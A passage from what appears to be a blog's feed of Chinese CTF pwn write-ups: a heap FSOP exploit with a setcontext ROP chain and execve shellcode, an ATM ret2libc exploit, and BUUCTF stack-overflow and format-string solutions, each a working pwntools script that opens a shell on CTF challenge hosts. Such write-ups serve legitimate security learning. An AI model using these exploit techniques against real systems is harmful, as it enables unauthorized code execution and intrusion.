class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal =[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># p = process(&quot;./heap&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28313</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;size? &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;idx? &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;content : &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment"># leak libc_base</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak-<span class="hljs-number">0x203b20</span><br>log.success(<span class="hljs-string">&quot;libc_base =&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># leak heap_base</span><br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content : &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = leak-<span class="hljs-number">0x290</span><br>log.success(<span class="hljs-string">&quot;heap_base =&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x500</span>)<br><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x710</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x700</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x510</span>)<br><br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x900</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">6</span>,p64(libc_base+<span class="hljs-number">0x21b190</span>)+p64(libc_base+<span class="hljs-number">0x21b190</span>)+p64(heap_base+<span class="hljs-number">0x2310</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x900</span>)<br><br>shellcode = <span class="hljs-string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br>fake_IO_FILE = heap_base + <span class="hljs-number">0x2310</span><br><br>f = flat(&#123;<br><span class="hljs-number">0x0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _flags</span><br><span class="hljs-number">0x8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_ptr </span><br><span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_end</span><br><span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_read_base</span><br>    <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_write_base</span><br>    <span class="hljs-number">0x28</span>: <span class="hljs-number">1</span>, <span class="hljs-comment"># _IO_write_ptr</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_write_end</span><br><span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x280</span>, <span class="hljs-comment"># _IO_buf_base</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_buf_end</span><br><span class="hljs-number">0x48</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_save_base</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_backup_base</span><br><span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _IO_save_end</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># markers</span><br><span class="hljs-number">0x68</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _chain</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _fileno</span><br><span class="hljs-number">0x78</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _flags2</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _old_offset</span><br><span class="hljs-number">0x88</span>: fake_IO_FILE, <span class="hljs-comment"># _cur_column</span><br><span class="hljs-number">0x90</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _vtable_offset</span><br><span class="hljs-number">0x98</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _shortbuf</span><br><span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment"># _lock</span><br><span class="hljs-number">0xa8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _offset</span><br><span class="hljs-number">0xb0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _codecvt</span><br><span class="hljs-number">0xb8</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xc0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _freeres_list</span><br><span class="hljs-number">0xc8</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># _freeres_buf</span><br><span class="hljs-number">0xd0</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># __pad5</span><br>    <span class="hljs-number">0xd8</span>: libc_base + <span class="hljs-number">0x202228</span>, <span class="hljs-comment">#_vtables</span><br>&#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>(f).ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0xe0</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>)<br>data = data.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x68</span><br>data += p64(libc_base + <span class="hljs-number">0x16c22c</span>) <span class="hljs-comment"># 0x000000000016c22c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]</span><br>data = data.ljust(<span class="hljs-number">0x280</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>data += p64(libc_base + <span class="hljs-number">0x176f0e</span>) <span class="hljs-comment"># 0x0000000000176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]</span><br>data += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x300</span>)<br>data = data.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>setcontext = flat(&#123;<br><span class="hljs-number">0x20</span>: libc_base + <span class="hljs-number">0x4a98d</span>, <span class="hljs-comment"># setcontext+61</span><br><span class="hljs-number">0xa0</span>: fake_IO_FILE+<span class="hljs-number">0x400</span>, <span class="hljs-comment"># mov rsp,QWORD PTR [rdx+0xa0]</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rbx,QWORD PTR [rdx+0x80]</span><br><span class="hljs-number">0x78</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rbp,QWORD PTR [rdx+0x78]</span><br><span class="hljs-number">0x48</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r12,QWORD PTR [rdx+0x48]</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r13,QWORD PTR [rdx+0x50]</span><br><span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r14,QWORD PTR [rdx+0x58]</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r15,QWORD PTR [rdx+0x60]</span><br><span class="hljs-number">0xa8</span>: libc_base + <span class="hljs-number">0x2882f</span>, <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0xa8] ; push rcx # 0x000000000002882f : ret</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rsi,QWORD PTR [rdx+0x70]</span><br><span class="hljs-number">0x68</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rdi,QWORD PTR [rdx+0x68]</span><br><span class="hljs-number">0x98</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0x98] </span><br><span class="hljs-number">0x28</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r8,QWORD PTR [rdx+0x28]</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov r9,QWORD PTR [rdx+0x30]</span><br><span class="hljs-number">0x88</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># mov rdx,QWORD PTR [rdx+0x88]</span><br>&#125;,filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data += setcontext<br>data = data.ljust(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(libc_base + <span class="hljs-number">0x10f75b</span>) <span class="hljs-comment"># 0x000000000010f75b : pop rdi ; ret</span><br>data += p64(heap_base)<br>data += p64(libc_base + <span class="hljs-number">0x110a4d</span>) <span class="hljs-comment"># 0x0000000000110a4d : pop rsi ; ret</span><br>data += p64(<span class="hljs-number">0x10000</span>)<br>data += p64(libc_base + <span class="hljs-number">0x66b9a</span>) <span class="hljs-comment"># 0x0000000000066b9a : pop rdx ; ret 0x19</span><br>data += p64(<span class="hljs-number">7</span>)<br>data += p64(libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base)<br>data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x19</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x600</span>)<br>data = data.ljust(<span class="hljs-number">0x600</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>data += shellcode<br><br>edit(<span class="hljs-number">8</span>,data[<span class="hljs-number">0x10</span>:])<br><br>Exit()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ATM"><a href="#ATM" class="headerlink" title="ATM"></a>ATM</h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>栈题，先用函数3扩展能写的字节数，在执行函数5，最后用函数4返回</p><p>printf函数地址都给了，直接ret2libc</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./app&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28166</span>)<br>elf = ELF(<span class="hljs-string">&quot;./app&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;password:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaaaa&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;4.Exit\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;deposit:&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;1111111&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;4.Exit\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;gift:&#x27;</span>)<br>printf_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><br>printf_offset = <span class="hljs-number">0x064770</span><br>system_offset = <span class="hljs-number">0x054d60</span><br>binsh_offset = <span class="hljs-number">0x1dc698</span><br><br>libc_base = printf_addr - printf_offset<br>system_addr = libc_base + system_offset<br>binsh = libc_base + binsh_offset<br><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base) )<br><br>pop_rdi = <span class="hljs-number">0x401233</span><br>ret = <span class="hljs-number">0x401234</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">360</span> + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system_addr)  <br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;4.Exit\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF wp</title>
      <link href="/2024/05/29/BUUCTF-wp/"/>
      <url>/2024/05/29/BUUCTF-wp/</url>
      
        <content type="html"><![CDATA[<p>BUUCTF的部分wp</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>简单题，直接nc</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序中给了后门，直接ret2text，注意一下栈平衡</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,29672)</span><br>p = process(<span class="hljs-string">&quot;pwn1&quot;</span>)<br><br>gdb.attach(p)<br><br>backdoor = <span class="hljs-number">0x401186</span><br>ret = <span class="hljs-number">0x401185</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>ret2text简单题</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25110</span>)<br><span class="hljs-comment">#p = process(&quot;./warmup_csaw_2016&quot;)</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;WOW:&quot;</span>)<br>back = p.recv(<span class="hljs-number">8</span>)<br>back = <span class="hljs-built_in">int</span>(back,<span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">0x8</span>)+p64(back)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>可以覆盖栈中的浮点数，也可以直接覆盖返回地址</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="覆盖浮点数"><a href="#覆盖浮点数" class="headerlink" title="覆盖浮点数"></a>覆盖浮点数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28058</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_1&quot;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">44</span>+struct.pack(<span class="hljs-string">&quot;&lt;fx&quot;</span>,<span class="hljs-number">11.28125</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26493</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_1&quot;)</span><br><br>catflag_addr = <span class="hljs-number">0x4006be</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(catflag_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>程序中替换了输入中的’I’为’you’，并赋值回原位置，从而造成了栈溢出</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26533</span>)<br>backdoor = <span class="hljs-number">0x08048F0D</span><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(backdoor)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>ret2text</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28636</span>)<br><br>backdoor = <span class="hljs-number">0x400596</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">128</span>+<span class="hljs-number">0x8</span>)+p64(backdoor)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>格式化字符串漏洞，有两种思路</p><ol><li>利用格式化字符串漏洞读取全局变量的值</li><li>利用格式化字符串漏洞覆盖全局变量的值</li></ol><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="读"><a href="#读" class="headerlink" title="读"></a>读</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,27945)</span><br><br>bss_addr = <span class="hljs-number">0x804c044</span><br><br>payload = p32(bss_addr)+<span class="hljs-string">b&#x27;%10$s&#x27;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Hello,&quot;</span>)<br>num = u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br><br><span class="hljs-comment">#info(num)</span><br><br>p.sendline(<span class="hljs-built_in">str</span>(num).encode())<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="写"><a href="#写" class="headerlink" title="写"></a>写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 